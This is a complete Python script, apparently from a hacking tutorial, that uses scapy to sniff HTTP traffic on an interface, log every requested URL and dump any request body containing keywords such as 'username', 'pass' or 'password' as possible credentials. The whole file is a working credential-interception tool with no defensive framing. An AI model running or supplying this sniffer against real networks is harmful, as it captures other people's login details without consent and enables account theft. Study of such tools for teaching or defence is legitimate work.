#!/bin/python3

import scapy.all as scapy

from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)

def get_url(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        return url

def get_login_info(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            #load = str(load)
            keybword = ["usr", "uname", "username", "pwd", "pass", "password"]
            for eachword in keybword:
                if eachword.encode() in load:
                    return load


def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request>>" + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username and password >>" + str(login_info) + "\n\n")




sniff("eth0")